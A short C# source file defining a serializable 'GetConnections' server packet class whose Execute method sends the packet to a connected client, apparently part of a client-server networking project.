using System;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ServerPackets
{
    [Serializable]
    public class GetConnections : IPacket
    {
        public GetConnections()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
    
}
